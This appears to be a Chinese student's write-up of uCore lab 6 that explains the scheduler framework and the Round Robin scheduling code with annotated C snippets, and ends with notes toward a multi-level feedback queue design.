<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 根据trapframe中断帧中的标志位,来执行具体的中断服务历程 */</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> T_PGFLT: <span class="comment">/* 页错误异常(page fault) */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = pgfault_handler(tf)) != <span class="number">0</span>) &#123;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">            <span class="comment">/* lab5新增:与进程相关的if判断语句 */</span></span><br><span class="line">            <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                panic(<span class="string">&quot;handle pgfault failed. ret=%d\n&quot;</span>, ret);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (trap_in_kernel(tf)) &#123;</span><br><span class="line">                    panic(<span class="string">&quot;handle pgfault failed in kernel mode. ret=%d\n&quot;</span>, ret);</span><br><span class="line">                &#125;</span><br><span class="line">                cprintf(<span class="string">&quot;killed by kernel.\n&quot;</span>);</span><br><span class="line">                panic(<span class="string">&quot;handle user mode pgfault failed. ret=%d\n&quot;</span>, ret); </span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SYSCALL: <span class="comment">/* 系统调用(syscall) */</span></span><br><span class="line">        syscall();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*  &lt;---- start ----&gt;  */</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    LAB3 : <span class="function">If some page replacement <span class="title">algorithm</span><span class="params">(such as CLOCK PRA)</span> need tick to change the priority of pages, </span></span><br><span class="line"><span class="function">    then you can add code here. </span></span><br><span class="line"><span class="function"><span class="meta">#<span class="meta-keyword">endif</span></span></span></span><br><span class="line"><span class="function">        ticks ++</span>;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        sched_class_proc_tick(current); <span class="comment">/* lab6新添:使得调度器能感知到时钟中断的产生,并调整调度相关的数据结构 */</span></span><br><span class="line">        <span class="keyword">break</span>;   </span><br><span class="line">            <span class="comment">/*  &lt;---- end ----&gt;  */</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_COM1: <span class="comment">/* 中断请求-串口中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;serial [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD: <span class="comment">/* 中断请求-键盘中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOU: <span class="comment">/* 中断请求-内核到用户空间触发的中断 */</span></span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK: <span class="comment">/* 中断请求-用户空间到内核触发的中断 */</span></span><br><span class="line">        panic(<span class="string">&quot;T_SWITCH_** ??\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE1: <span class="comment">/* 中断请求-IDE通道1中断 */</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE2: <span class="comment">/* 中断请求-IDE通道2中断 */</span></span><br><span class="line">            <span class="comment">/* 本实验不涉及这一部分 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* lab5改动:完善了报错处理 */</span></span><br><span class="line">        print_trapframe(tf); <span class="comment">/* 打印trapframe结构体(中断帧,用于存储执行中断的信息) */</span></span><br><span class="line">        <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;unhandled trap.\n&quot;</span>);</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        panic(<span class="string">&quot;unexpected trap in kernel.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched_class_proc_tick</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != idleproc) &#123;</span><br><span class="line">        sched_class-&gt;proc_tick(rq, proc); <span class="comment">/* 处理时钟中断,更新对应的调度参数 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* idleproc处理时钟中断:需要进行调度 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习1-使用-Round-Robin-调度算法"><a href="#练习1-使用-Round-Robin-调度算法" class="headerlink" title="练习1-使用 Round Robin 调度算法"></a>练习1-使用 Round Robin 调度算法</h2><ul>
<li>理解并分析 sched_class（调度类，调度器框架）中各个函数指针的用法，并结合 Round Robin 调度算法描 ucore 的调度执行过程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">/* 零,该调度类的名称 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> (*init)(struct run_queue *rq); <span class="comment">/* 一,初始化运行队列 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc); <span class="comment">/* 二,将proc(进程)放入runqueue(运行队列),必须使用&quot;rq_lock&quot;调用此函数 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc); <span class="comment">/* 三,将proc(进程)移出runqueue(运行队列),必须使用&quot;rq_lock&quot;调用此函数 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *(*<span class="title">pick_next</span>)(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>);</span> <span class="comment">/* 四,选择下一个可运行任务 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc); <span class="comment">/* 五,以减小当前运行进程的time-tick(剩余时间片) */</span></span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">default_sched_class</span> =</span> &#123;</span><br><span class="line">    <span class="comment">/* 六,定义一个c语言类的实现,提供调度算法的切换接口(不属于调度类但后续会遇到) */</span></span><br><span class="line">    .name = <span class="string">&quot;RR_scheduler&quot;</span>,</span><br><span class="line">    .init = RR_init,</span><br><span class="line">    .enqueue = RR_enqueue,</span><br><span class="line">    .dequeue = RR_dequeue,</span><br><span class="line">    .pick_next = RR_pick_next,</span><br><span class="line">    .proc_tick = RR_proc_tick,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>RR调度算法的调度思想是让所有 runnable 态的进程分时轮流使用 CPU 时间 </li>
<li>RR调度器维护当前 runnable 进程的有序运行队列</li>
<li>当前进程的时间片用完之后，调度器将当前进程放置到运行队列的尾部，再从其头部取出进程进行调度</li>
</ul>
<p>零，const char *name：指向了当前调度算法的名称字符串 </p>
<p>一，<code>void (*init)(struct run_queue *rq)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_init</span><span class="params">(struct run_queue *rq)</span> </span>&#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list)); <span class="comment">/* 置空链表 */</span></span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>; <span class="comment">/* 进程总数变为&#x27;0&#x27; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于初始化传入的就绪队列，RR算法中只初始化了对应 <code>run_queue</code> 的 <code>run_list</code> 成员</li>
</ul>
<p>二，<code>void (*enqueue)(struct run_queue *rq, struct proc_struct *proc)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_enqueue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link)); <span class="comment">/* 插入结点前 */</span></span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice; <span class="comment">/* 初始化时间片(如果进程在当前的执行时间片已经用完,需要等到下一次有机会运行时才能再执行一段时间) */</span></span><br><span class="line">  &#125;</span><br><span class="line">    proc-&gt;rq = rq; <span class="comment">/* 更新运行队列 */</span></span><br><span class="line">    rq-&gt;proc_num ++; <span class="comment">/* 运行队列中的进程数增加 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于将某个进程添加进传入的队列中</li>
<li>RR算法除了将进程添加进队列中，还重置了相关的时间片</li>
</ul>
<p>三，<code>void (*dequeue)(struct run_queue *rq, struct proc_struct *proc)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_dequeue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link)); <span class="comment">/* 脱链 */</span></span><br><span class="line">    rq-&gt;proc_num --; <span class="comment">/* 运行队列中的进程数减少 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">list_del_init</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> </span>&#123;</span><br><span class="line">    list_del(listelm);</span><br><span class="line">    list_init(listelm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于将某个进程从传入的队列中移除</li>
</ul>
<p>四，<code>struct proc_struct *(*pick_next)(struct run_queue *rq)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">RR_pick_next</span><span class="params">(struct run_queue *rq)</span> </span>&#123; <span class="comment">/* [首次适配] */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link); <span class="comment">/* 遇到第一个合适的就直接返回了 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于在传入的运行队列中选择出一个最适合运行的进程（选择进程但不将从队列中移除）</li>
<li>在RR算法采用 [首次适配] ，每次都只选择队列最前面那个进程</li>
</ul>
<p>五，<code>void (*proc_tick)(struct run_queue *rq, struct proc_struct *proc)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_proc_tick</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --; <span class="comment">/* 进行时间片的递减 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 如果用完时间片,那么就使该进程变成可调度状态,等待再次调度 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该函数会在时间中断处理例程中被调用（ <code>sched_class_proc_tick(current)</code> 中的 <code>sched_class-&gt;proc_tick(rq, proc)</code> ），以减小当前运行进程的剩余时间片，若时间片耗尽，则设置当前进程的 <code>need_resched</code> 为 1</li>
</ul>
<p><strong>结合 Round Robin 调度算法描 uCore 的调度执行过程：</strong></p>
<ul>
<li>首先，uCore调用 <code>sched_init</code> 函数用于初始化相关的就绪队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    list_init(&amp;timer_list); <span class="comment">/* 这个timer_list在之后的实验中会出现 */</span></span><br><span class="line"></span><br><span class="line">    sched_class = &amp;default_sched_class; <span class="comment">/* 提供调度算法的切换接口 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这里让我联想到了面向对象中的类与实例:</span></span><br><span class="line"><span class="comment">    sched_class其实就是一组接口,有点类似于一组函数指针</span></span><br><span class="line"><span class="comment">    它起到了和“实例化”差不多的效果,可以任意调用该类中的函数</span></span><br><span class="line"><span class="comment">    没准这就是面向对象的雏形,只不过面向对象更强大,采用了更加高级的数据抽象的形式</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    rq = &amp;__rq;</span><br><span class="line">    rq-&gt;max_time_slice = MAX_TIME_SLICE;</span><br><span class="line">    sched_class-&gt;init(rq); <span class="comment">/* 调用RR_init初始化rq运行列表 */</span></span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">&quot;sched class: %s\n&quot;</span>, sched_class-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>之后在 <code>proc_init</code> 函数中，建立第一个内核进程，并将其添加至就绪队列中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    list_init(&amp;proc_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HASH_LIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* 分配一个物理页,作为proc_struct结构体 */</span></span><br><span class="line">        panic(<span class="string">&quot;cannot alloc idleproc.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idleproc-&gt;pid = <span class="number">0</span>; <span class="comment">/* 将空闲进程作为第一个进程,pid为0 */</span></span><br><span class="line">    idleproc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 设置该空闲进程始终可运行 */</span></span><br><span class="line">    idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack; <span class="comment">/* 设置空闲进程的内核栈 */</span></span><br><span class="line">    idleproc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 设置该空闲进程为可调度 */</span></span><br><span class="line">    set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;idle&quot; */</span></span><br><span class="line">    nr_process ++; <span class="comment">/* 将全局线程的数目加1 */</span></span><br><span class="line"></span><br><span class="line">    current = idleproc; <span class="comment">/* 设置当前进程为idleproc */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = kernel_thread(init_main, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* 先设置trapframe,最后调用do_fork(详情请参考起前面的实验) */</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123; <span class="comment">/* 内核进程创建失败 */</span></span><br><span class="line">        panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initproc = find_proc(pid); <span class="comment">/* 通过pid查找proc_struct,并赋值给initproc */</span></span><br><span class="line">    set_proc_name(initproc, <span class="string">&quot;init&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;init&quot; */</span></span><br><span class="line"></span><br><span class="line">    assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">    assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当所有的初始化完成后，uCore执行 <code>cpu_idle</code> 函数，并在其内部循环执行 <code>schedule</code> 函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">current</span> =</span> <span class="literal">NULL</span>; <span class="comment">/* 指向当前的进程 */</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">cpu_idle</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;need_resched) &#123; <span class="comment">/* 是否需要被调度 */</span></span><br><span class="line">            schedule(); <span class="comment">/* 准备开始调度进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 <code>sched_class_enqueue</code> 将当前进程添加进就绪队列中（因为当前进程要被切换出CPU了）</li>
<li>然后，调用 <code>sched_class_pick_next</code> 获取就绪队列中可被轮换至CPU的进程</li>
<li>如果存在可用的进程，则调用 <code>sched_class_dequeue</code> 函数，将该进程移出就绪队列，并在之后执行 <code>proc_run</code> 函数进行进程上下文切换</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* 相比与上一个实验要朴实得多,可能做了优化吧 */</span></span><br><span class="line">        <span class="keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;</span><br><span class="line">            sched_class_enqueue(current); <span class="comment">/* 将current添加进就绪队列中 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((next = sched_class_pick_next()) != <span class="literal">NULL</span>) &#123; <span class="comment">/* 获取就绪队列中可被轮换至CPU的进程 */</span></span><br><span class="line">            sched_class_dequeue(next); <span class="comment">/* 如果存在可用的进程,将该进程移出就绪队列 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            next = idleproc; <span class="comment">/* 判断将要被调度的进程为空闲进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        next-&gt;runs ++; <span class="comment">/* 目标进程被调度的次数增加 */</span></span><br><span class="line">        <span class="keyword">if</span> (next != current) &#123;</span><br><span class="line">            <span class="comment">/* 如果调度进程不是当前进程,则运行proc_run,否则会重新进入空闲进程(循环) */</span></span><br><span class="line">            proc_run(next); <span class="comment">/* 执行进程调度操作(上下文切换) */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sched_class_enqueue 的具体实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched_class_enqueue</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != idleproc) &#123;</span><br><span class="line">        sched_class-&gt;enqueue(rq, proc); <span class="comment">/* RR_enqueue的外包装 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sched_class_pick_next</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">sched_class_pick_next</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sched_class-&gt;pick_next(rq); <span class="comment">/* RR_pick_next的外包装 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sched_class_dequeue</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched_class_dequeue</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    sched_class-&gt;dequeue(rq, proc); <span class="comment">/* RR_dequeue的外包装 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>设计多级反馈队列调度算法</strong></p>
<p>我自己的理解：</p>
<ul>
<li>其实多级反馈队列就是把进程进行了优先级分级，在每一级中的时间片长度不一样（第一级的优先度最高，时间片最短，被 CPU 调度的机会更多）</li>
<li>在同一个优先级的队列内使用时间片轮转算法</li>
<li>CPU 如果一次没有执行完毕目标进程，那么该进程就会降级（降到下一级）</li>
<li>在最后一级中，如果一次还是没有执行完毕目标进程，那么下次就会在这一级中实现 RR 时间片轮转算法</li>
